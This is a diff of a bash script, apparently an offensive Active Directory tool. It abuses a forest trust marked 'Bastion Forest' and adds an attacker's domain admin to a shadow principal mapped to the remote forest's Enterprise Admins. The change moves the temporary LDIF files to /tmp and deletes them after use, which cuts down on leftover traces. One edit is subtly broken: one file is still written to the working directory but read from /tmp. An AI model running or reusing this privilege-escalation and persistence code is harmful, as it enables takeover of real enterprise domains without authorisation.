@@ -44,19 +44,21 @@ if __name__ == '__main__':
 EOF
 
 b64sid=$(python3 /tmp/convSid.py $shadowprinsid)
+rm /tmp/convSid.py
 
 # Create trust
 sudo samba-tool domain trust create $remdom.$remsuffix --type=forest --direction=incoming --treat-as-external -U $remdom.$remsuffix\\$remdomadmuser --use-krb5-ccache=$remccachepath --local-dc-username=$localdom.$localsuffix\\$localdomadmuser --local-dc-use-krb5-ccache=$localccachepath
 
 # Modify trust attributes on remote
-cat > remtrustattr.ldif << EOF
+cat > /tmp/remtrustattr.ldif << EOF
 dn: CN=$localdom.$localsuffix,CN=System,DC=$remdom,DC=$remsuffix
 action: modify
 replace: trustAttributes
 trustAttributes: 1096 # Bastion Forest
 EOF
 
-KRB5CCNAME=$remccachepath ldapmodify -Q -Y GSSAPI -H ldap://$remote -f remtrustattr.ldif
+KRB5CCNAME=$remccachepath ldapmodify -Q -Y GSSAPI -H ldap://$remote -f /tmp/remtrustattr.ldif
+rm /tmp/remtrustattr.ldif
 
 # Modify trust attributes locally
 cat > localtrustattr.ldif << EOF
@@ -66,20 +68,22 @@ replace: trustAttributes
 trustAttributes: 1096 # Bastion Forest
 EOF
 
-KRB5CCNAME=$localccachepath ldapmodify -Q -Y GSSAPI -H ldap://127.0.0.1 -f localtrustattr.ldif
+KRB5CCNAME=$localccachepath ldapmodify -Q -Y GSSAPI -H ldap://127.0.0.1 -f /tmp/localtrustattr.ldif
+rm /tmp/localtrustattr.ldif
 
 # Create shadow principal container
-cat > shadowcontaineradd.ldif << EOF
+cat > /tmp/shadowcontaineradd.ldif << EOF
 dn: CN=Shadow Principal Configuration,CN=Configuration,DC=$localdom,DC=$localsuffix
 objectClass: top
 objectClass: msDS-ShadowPrincipalContainer
 description: Container for Shadow Principal objects
 EOF
 
-KRB5CCNAME=$localccachepath ldapadd -Q -Y GSSAPI -H ldap://127.0.0.1 -f shadowcontaineradd.ldif
+KRB5CCNAME=$localccachepath ldapadd -Q -Y GSSAPI -H ldap://127.0.0.1 -f /tmp/shadowcontaineradd.ldif
+rm /tmp/shadowcontaineradd.ldif
 
 # Create "Enterprise Admins" shadow principal and add attacker DA user to it
-cat > shadowprin.ldif << EOF
+cat > /tmp/shadowprin.ldif << EOF
 dn: CN=$remdom-Enterprise Admins,CN=Shadow Principal Configuration,CN=Configuration,DC=$localdom,DC=$localsuffix
 changetype: add
 objectClass: msDS-ShadowPrincipal
@@ -87,4 +91,5 @@ msDS-ShadowPrincipalSid: $b64sid
 member: CN=$localdomadmuser,CN=Users,DC=$localdom,DC=$localsuffix
 EOF
 
-KRB5CCNAME=$localccachepath ldapmodify -Q -Y GSSAPI -H ldap://127.0.0.1 -f shadowprin.ldif
+KRB5CCNAME=$localccachepath ldapmodify -Q -Y GSSAPI -H ldap://127.0.0.1 -f /tmp/shadowprin.ldif
+rm /tmp/shadowprin.ldif
